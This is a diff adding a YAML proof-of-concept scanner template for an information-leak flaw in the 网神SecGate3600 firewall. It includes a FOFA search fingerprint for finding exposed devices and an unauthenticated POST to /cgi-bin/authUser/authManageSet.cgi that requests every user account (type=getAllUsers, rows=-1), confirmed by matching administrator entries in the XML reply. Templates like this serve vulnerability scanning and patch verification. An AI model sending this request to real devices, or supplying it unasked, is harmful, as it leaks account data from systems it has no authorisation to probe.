@@ -1,0 +1,22 @@
+id: poc-yaml-secgate-3600-authmanageset-cgi-info-leak
+info:
+  name: 网神SecGate3600 authManageSet.cgi 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 网神SecGate3600
+  fofa: body="sec_gate_image/login_02.gif"
+variables:
+  t1: gbk_encode("管理员")
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"sec_gate_image/login_02.gif")
+- method: POST
+  path: /cgi-bin/authUser/authManageSet.cgi
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc
+  expression: "status_code == 200 && \ncontains(body,\"rows\") &&\ncontains(body,t1)\
+    \ &&\ncontains(content_type,\"text/xml\")\n"
+transport: http
